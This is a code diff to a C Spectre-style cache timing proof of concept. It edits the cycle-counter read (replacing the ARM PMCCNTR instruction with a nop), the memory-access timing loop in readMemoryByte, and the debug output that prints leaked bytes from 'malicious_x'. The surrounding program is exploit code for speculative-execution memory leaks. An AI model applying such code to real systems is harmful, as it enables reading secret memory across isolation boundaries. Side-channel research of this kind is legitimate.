@@ -3,11 +3,7 @@
 #include <string.h>
 #include <assert.h>
 
-#define VERISON "2021-06-21 16:59"
-
-#ifdef X86
-#include <x86intrin.h>
-#endif
+#define VERISON "2021-09-15 12:09"
 
 int MAX_TRIES = 10;
 unsigned int CACHE_HIT_THRESHOLD = 30;
@@ -68,8 +64,9 @@ uint64_t read_cycles()
 
 	// Read PMCCNTR
 	__asm__ volatile(
-		"mrs %0, pmccntr_el0"
-		: "=r"(result));
+		// "mrs %0, pmccntr_el0"
+		// : "=r"(result));
+		"nop");
 
 	return result;
 }
@@ -79,10 +76,8 @@ uint64_t read_cycles()
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 {
 	static int results[256];
-	static double timing[256];
 	int tries, i, j, k, mix_i;
 	unsigned int junk = 0;
-	unsigned int junk_arr[] = {0, 0, 0, 0, 0, 0, 0, 0}; 
 	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
@@ -144,10 +139,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			#else
 			barrier();
 			time1 = read_cycles();
-			// junk = *addr;				   /* MEMORY ACCESS TO TIME */
-			for (int ii = 0; ii < 200; ii++) {
-				junk += *addr;
-			}
+			junk = *addr;				   /* MEMORY ACCESS TO TIME */
 			barrier();
 			time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			#endif
@@ -160,7 +152,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 			}
-			timing[mix_i] += time2;
 		}
 
 		#ifdef DEBUG
@@ -187,13 +178,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 				k = i;
 			}
 		}
-	}
-
-	/* Print timing */
-	for (i = 0; i < 256; i++)
-	{
-		timing[i] /= MAX_TRIES;
-		printf("%p,%f\n", i, timing[i]);
 	}
 
 	results[0] ^= junk; /* use junk so code above won't get optimized out*/
@@ -225,8 +209,6 @@ int main(int argc, char **argv)
 		sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);
 		sscanf(argv[3], "%d", &len);
 	}
-	len = 1;
-	MAX_TRIES = 100;
 	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);
 
 	for (size_t i = 0; i < sizeof(array2); i++)
@@ -235,7 +217,7 @@ int main(int argc, char **argv)
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0)
 	{
-		printf("Reading@malicious_x=%p \n", (void *)malicious_x);
+		printf("Reading@malicious_x=%p ", (void *)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 
 		printf("0x%02X='%c' score=%d ", value[0],
